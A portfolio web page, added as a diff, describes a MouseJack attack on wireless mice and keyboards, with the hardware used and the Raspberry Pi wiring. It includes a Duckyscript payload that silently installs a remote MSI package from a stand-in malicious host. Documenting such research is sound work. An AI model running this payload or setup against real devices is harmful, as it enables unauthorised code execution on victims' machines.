@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RCE via MouseJack Vulnerability - Cybersecurity Portfolio</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="terminal">
+        <div class="terminal-header">[Terminal] - RCE via MouseJack Vulnerability</div>
+        <div class="terminal-content">
+            <pre>
+╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║ ██████╗  ██████╗███████╗    ██╗   ██╗██╗ █████╗                                                      ║
+║ ██╔══██╗██╔════╝██╔════╝    ██║   ██║██║██╔══██╗                                                     ║
+║ ██████╔╝██║     █████╗      ██║   ██║██║███████║                                                     ║
+║ ██╔══██╗██║     ██╔══╝      ╚██╗ ██╔╝██║██╔══██║                                                     ║
+║ ██║  ██║╚██████╗███████╗     ╚████╔╝ ██║██║  ██║                                                     ║
+║ ╚═╝  ╚═╝ ╚═════╝╚══════╝      ╚═══╝  ╚═╝╚═╝  ╚═╝                                                     ║
+║ ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███████╗     ██╗ █████╗  ██████╗██╗  ██╗                        ║
+║ ████╗ ████║██╔═══██╗██║   ██║██╔════╝██╔════╝     ██║██╔══██╗██╔════╝██║ ██╔╝                        ║
+║ ██╔████╔██║██║   ██║██║   ██║███████╗█████╗       ██║███████║██║     █████╔╝                         ║
+║ ██║╚██╔╝██║██║   ██║██║   ██║╚════██║██╔══╝  ██   ██║██╔══██║██║     ██╔═██╗                         ║
+║ ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║███████╗╚█████╔╝██║  ██║╚██████╗██║  ██╗                        ║
+║ ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝ ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                        ║
+║ ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗██████╗  █████╗ ██████╗ ██╗██╗     ██╗████████╗██╗   ██╗ ║
+║ ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║██║     ██║╚══██╔══╝╚██╗ ██╔╝ ║
+║ ██║   ██║██║   ██║██║     ██╔██╗ ██║█████╗  ██████╔╝███████║██████╔╝██║██║     ██║   ██║    ╚████╔╝  ║
+║ ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║██╔══██╗██║██║     ██║   ██║     ╚██╔╝   ║
+║  ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║██████╔╝██║███████╗██║   ██║      ██║    ║
+║   ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚══════╝╚═╝   ╚═╝      ╚═╝    ║
+╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+> I exploited a widespread vulnerability found in the chips of wireless HID devices.
+  This allows an attacker to remotely inject keystrokes into a target machine by
+  hijacking unencrypted signals from wireless mice and keyboards, and sending out 
+  forged commands.
+                
+> I used: NRF24L Chip, Raspberry Pi Zero W, 3.3V Voltage Regulator, an External
+  Antenna, 3.7V power source, 32GB MicroSD card, PowerShell, and Duckyscript.
+                
+> How did it work?
+  - Wireless mice/keyboards use unverified radio channels, making them vulnerable 
+    to spoofing.
+  - Many manufacturers (e.g. Dell, Microsoft, Logitech, HP, Gigabyte, etc) use the 
+    NRF24L chip (operating at 2.4GHz on channels 2400mhz to 2483mhz), which allows
+    attackers to capture MAC addresses and send forged keystrokes to a victim's device.
+  - Because Windows treats both mice and keyboards as HID devices, an attacker 
+    controlling a mouse can still execute keyboard commands, leaving the device open
+    to Remote Code Execution.
+                
+> Hardware Implementation:
+  - Instead of using an expensive Crazyradio PA adapter, I directly soldered an 
+    NRF24L module to a 3.3V voltage regulator and wired it to my Raspberry Pi 
+    Zero W via the GPIO pins listed below:
+
+    NRF24L01 adapter board | Raspberry Pi Zero W
+    VCC (5V)	           | Pin 2 (5V)
+    GND	                   | Pin 6 (GND)
+    CE	                   | Pin 22 (GPIO25)
+    CSN	                   | Pin 24 (GPIO8, SPI_CE0)
+    SCK	                   | Pin 23 (GPIO11, SPI_CLK)
+    MOSI	           | Pin 19 (GPIO10, SPI_MOSI)
+    MISO	           | Pin 21 (GPIO9, SPI_MISO)
+
+  - This allowed me to still utilise the vulnerability found on the NRF24L01 chipset,
+    but without having to pay the extra for ready to use adapter from Crazy-Radio.
+                
+> Command Execution & Payload Delivery:
+  - Here is an example of a payload an attacker could use to execute malware.
+                  
+  GUI r
+  DELAY 300
+  STRING msiexec /i http://PrivateHostingProvider.com/maliciousfile.msi /quiet
+  DELAY 300
+  ENTER
+
+  - This isn't the only type of attack that could be done with this setup.
+    Most RubberDucky payloads will also work with this attack method Because
+    both attacks act as HID devices and run similar commands.
+
+Type 'cd ..' to return to the project list.</pre>
+        </div>
+
+
+        <div class="input-line">
+            <span class="command">user@portfolio~$</span>
+            <input type="text" id="user-input" class="input" autofocus />
+        </div>
+    </div>
+
+    <script src="scripts/projectscript.js"></script>
+</body>
+</html>
